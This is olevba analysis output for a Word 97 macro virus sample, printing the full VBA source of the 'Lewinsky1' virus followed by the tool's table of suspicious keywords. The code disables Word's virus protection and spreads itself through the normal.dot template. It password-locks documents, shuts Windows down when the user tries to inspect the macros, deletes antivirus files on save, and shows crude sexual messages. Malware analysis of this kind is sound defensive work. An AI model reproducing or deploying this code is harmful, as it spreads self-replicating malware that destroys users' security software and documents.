olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Bismark
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Bismark - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Lewinsky.bas 
in file: ./Virus.MSWord.Bismark - OLE stream: 'Macros/VBA/Lewinsky'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Sub AutoOpen()
    On Error GoTo Lewinsky

    Application.ScreenUpdating = False
    Application.DisplayAlerts = wdAlertsNone
      
    SetAttr "c:\programmi\microsoft office\modelli\normal.dot", vbNormal

    WordBasic.DisableAutoMacros 0
    Options.VirusProtection = False

    Set ActiveDoc = ActiveDocument
    Set GlobalDoc = NormalTemplate

    documentinstalled = False
    Globalinstalled = False

    For I = 1 To ActiveDocument.VBProject.VBComponents.Count
        If ActiveDocument.VBProject.VBComponents(I).Name = "Lewinsky" Then
            documentinstalled = True
        End If
   Next
  
   For J = 1 To NormalTemplate.VBProject.VBComponents.Count
        If NormalTemplate.VBProject.VBComponents(J).Name = "Lewinsky" Then
            Globalinstalled = True
        End If
    Next

    If documentinstalled = False Then
        Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Lewinsky", Object:=wdOrganizerObjectProjectItems
        ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
        
    End If

    If Globalinstalled = False Then
        Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Lewinsky", Object:=wdOrganizerObjectProjectItems
        Options.SaveNormalPrompt = False
        
    End If

    Application.DisplayAlerts = wdAlertsAll

Lewinsky:
Lewinsky
End Sub
Sub Lewinsky()
On Error GoTo Lewinsky
Application.StatusBar = True
StatusBar = "Lewinsky1 WM97"
Application.Caption = "Lewinsky1 WM97"
With ActiveDocument
.BuiltInDocumentProperties(wdPropertyTitle) = "Lewinsky1"
.BuiltInDocumentProperties(wdPropertySubject) = "Word Macro BJ"
.BuiltInDocumentProperties(wdPropertyAuthor) = "WH 1998"
.BuiltInDocumentProperties(wdPropertyManager) = "WH 1998"
.BuiltInDocumentProperties(wdPropertyCompany) = "BJ Productions"
.BuiltInDocumentProperties(wdPropertyComments) = "This Word Macro Virus was Made By WH"
End With
If WeekDay(Now()) = 20 And Hour(Now()) = 12 Then
AutoCorrect.Entries.Add Name:="the", Value:="Word Macro Virus Lewinsky1, Written By BJ"
Else
End If
Lewinsky:
End Sub
Sub ToolsMacro()
On Error GoTo Lewinsky
ActiveDocument.Password = "Lewinskybj"
Documents.Close SaveChanges:=wdSaveChanges

Assistant.Visible = True
With Assistant.NewBalloon
.Icon = msoIconAlert
.Text = "Hi Bill, I'm ready for a new BJ"
.Heading = "Word Macro Virus Lewinsky1"
.Animation = msoAnimationSearching
.Show
End With
Tasks.ExitWindows

Lewinsky:
End Sub
Sub Toolscustomize()
On Error GoTo Lewinsky
ActiveDocument.Password = "Lewinsky"
Documents.Close SaveChanges:=wdSaveChanges

Assistant.Visible = True
With Assistant.NewBalloon
.Icon = msoIconAlert
.Text = "Hi Bill, I'm ready for a new BJ"
.Heading = "Word Macro Virus Lewinsky1"
.Animation = msoAnimationSearching
.Show
End With
Tasks.ExitWindows

Lewinsky:
End Sub
Sub ViewVBcode()
On Error GoTo Lewinsky
ActiveDocument.Password = "Lewinsky"
Documents.Close SaveChanges:=wdSaveChanges

Assistant.Visible = True
With Assistant.NewBalloon
.Icon = msoIconAlert
.Text = "Hi Bill, I'm ready for a new BJ"
.Heading = "Word Macro Virus Lewinsky1"
.Animation = msoAnimationSearching
.Show
End With
Tasks.ExitWindows

Lewinsky:
End Sub
Sub FileSave()
On Error Resume Next
Kill "c:\programmi\norton antivirus\*.dat"
Kill "c:\f-prot\*.*"
Kill "C:\programmi\antiviral toolkit pro\*.*"
Kill "C:\programmi\avp\*.*"
Kill "C:\programmi\mcafee\viruscan\*.*"
Kill "C:\programmi\pavw95\*.*"
ActiveDocument.Save

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

